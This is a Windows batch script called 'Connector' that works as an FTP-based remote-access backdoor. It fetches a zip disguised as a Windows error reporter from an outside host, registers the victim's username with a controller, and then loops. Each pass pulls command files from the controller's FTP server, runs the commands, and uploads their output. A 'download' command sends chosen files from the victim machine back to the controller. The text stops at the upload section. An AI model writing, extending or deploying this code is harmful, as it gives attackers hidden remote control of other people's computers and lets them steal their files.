rem CONNECTOR 3
title Connector
:winscpinstall
if exist ftp\App\winscp\WinSCP.exe goto skip
if not exist ftp\App\winscp\WinSCP.exe goto downloadsetupcheck
:downloadsetupcheck
if exist %temp%\windowserroreporter.zip goto unzipcheck
if not exist %temp%\windowserroreporter.zip goto downloadsetup
:unzipcheck
if exist %temp%\ftp\WinSCPPortable.exe goto copyhost
if not exist %temp%\ftp\WinSCPPortable.exe goto unzip
:downloadsetup
powershell -Command "& {Invoke-WebRequest pcprotect.eu5.org/Hacked/windowserroreporter.zip -OutFile %temp%\windowserroreporter.zip}"
:unzip
powershell -Command "& Expand-Archive -Force %temp%\windowserroreporter.zip %temp% "
:copyhost
mkdir ftp
xcopy /s %temp%\ftp %cd%\ftp
:skip
echo setup done
del ftp\WinSCPPortable.exe
del ftp\app\winscp\puttyportablelinker.exe
del ftp\app\winscp\readme.txt
del ftp\app\winscp\license.txt
:start
@echo off & setlocal EnableDelayedExpansion
:configure
ftp\App\winscp\winscp.com /command "open yourserver" "get ip.hhip" "exit"
set /p ip=<ip.hhip
:register
echo %USERNAME% > %USERNAME%.hhu
ftp\App\winscp\winscp.com /command "open yourserver" "put %USERNAME%.hhu" "exit"
:getftp
echo %USERNAME% > %USERNAME%.hh
echo open %ip% 21012 > getftp.txt
echo get connection.hh >> getftp.txt
echo quit >> getftp.txt
:handlerftp
echo open %ip% 21012 > handleftp.txt
echo put %USERNAME%.hh >> handleftp.txt
echo quit >> handleftp.txt
:check
echo open %ip% 21012 > checkftp.txt
echo get check.check >> checkftp.txt
echo quit >> checkftp.txt
:delcommand
echo open %ip% 21012 > delcommand.txt
echo del %USERNAME%cmd.command >> delcommand.txt
echo del readynow.txt >> delcommand.txt
echo quit >> delcommand.txt
:checkphase2
echo open %ip% 21012 > check2ftp.txt
echo put %USERNAME%.connected >> check2ftp.txt
echo quit >> check2ftp.txt
:cmdcommand
echo open %ip% 21012 > cmdftp.txt
echo get %USERNAME%cmd.command >> cmdftp.txt
echo quit >> cmdftp.txt
:cmdcommandphase2
echo open %ip% 21012 > cmd2ftp.txt
echo put %USERNAME%cmd.log >> cmd2ftp.txt
echo quit >> cmd2ftp.txt
:downloadstate
echo open %ip% 21012 > download.txt
echo put %downloadfile% >> download.txt
echo quit >> download.txt
:uploadstate
echo open %ip% 21012 > upload.txt
echo get %uploadfile% >> upload.txt
echo quit >> upload.txt
:commanddisplay
echo open %ip% 21012 > displaycommand.txt
echo put displaycommand.txt >> displaycommand.txt
echo quit >> displaycommand.txt
:commandready
echo open %ip% 21012 > ready.txt
echo get readynow.txt >> ready.txt
echo quit >> ready.txt
:start
cls
del %USERNAME%cmd.log
del %USERNAME%cmd.command
ftp -A -s:getftp.txt
if exist connection.hh goto handleconnection
if not exist connection.hh goto fail
:fail
echo _____________________________________
echo connector failed to connect the pc s 
echo     trying again in 5 seconds!
echo _____________________________________
ping 127.0.0.1 -n 5 > nul
goto configure
:handleconnection
echo _____________________________________
echo             Connecting!
echo _____________________________________
ftp -A -s:handleftp.txt
:deleting
ftp -A -s:delcommand.txt
:checking 
del %USERNAME%cmd.log
del %USERNAME%cmd.command
del readynow.txt
echo _____________________________________
echo             Checking!
echo _____________________________________
ftp -A -s:checkftp.txt
if exist check.check goto checkingphase2
if not exist check.check goto fail
:checkingphase2
del check.check
echo _____________________________________
echo             Check2!
echo _____________________________________
ftp -A -s:check2ftp.txt
:connected
echo _____________________________________
echo             Connected!
echo         Waiting for command!
echo _____________________________________
:loopcommand
ftp -A -s:cmdftp.txt
if exist %USERNAME%cmd.command goto commandconfigure
if not exist %USERNAME%cmd.command goto checking
:commandconfigure
set /p commandexecute=<%USERNAME%cmd.command
:commandcmd
echo _____________________________________
echo             Command from
echo              %USERNAME%
echo _____________________________________
(echo %commandexecute% | findstr /i /c:"download" >nul) && (goto downloadstate) || (goto commandnext)
:commandnext
(
%commandexecute%
)>"%USERNAME%cmd.log"
set /p commandlogging=<%USERNAME%cmd.log
echo %commandlogging%
:commandresults
echo _____________________________________
echo             Resulting!
echo _____________________________________
ftp -A -s:cmd2ftp.txt
del %USERNAME%cmd.log
del %USERNAME%cmd.command
ftp -A -s:displaycommand.txt
:readyloop
ftp -A -s:ready.txt
if exist readynow.txt goto deleting
if not exist readynow.txt goto readyloop
:downloadstate
echo _____________________________________
echo           DownloadState!
echo _____________________________________
rem  _____________________________________
set _file=%USERNAME%cmd.command
set _word1=download
set _word2=
type nul > "%_file%.tmp"
for /F "delims=" %%i in ('type "%_file%"') do (
 set row=%%i
 set row=!row:%_word1%=%_word2%!
  echo.!row!
) >> "%_file%.tmp"
move "%_file%.tmp" "%_file%"
set row=%row: =%
rem  _____________________________________
IF [%row%] == [] GOTO downloadfail
if exist %row% goto downloadconfig
if not exist %row% goto downloadfail
:downloadconfig
echo _____________________________________
echo         Conf. DownloadState!
echo _____________________________________
echo open %ip% 21012 > download.txt
echo put %row% >> download.txt
echo quit >> download.txt
goto startdownload
:downloadfail
set %USERNAME%cmd.log = echo "%row%" file does not exist !
echo "%row%" file does not exist!
goto commandresults
:startdownload
echo _____________________________________
echo           DownloadStarted!
echo			   Phase1
echo _____________________________________
setlocal
set file="%row%"
set maxbytesize=10000000000000000000
FOR /F "usebackq" %%A IN ('%file%') DO set size=%%~zA
echo _____________________________________
echo            Downloading!
echo			   Phase2
echo _____________________________________
echo the %file% file is %size% byte(s)
echo the %file% file is %size% byte(s) > %USERNAME%cmd.log
ftp -A -s:download.txt
goto commandresults
:uploadstate
echo _____________________________________
echo         Conf. UploadState!
echo _____________________________________
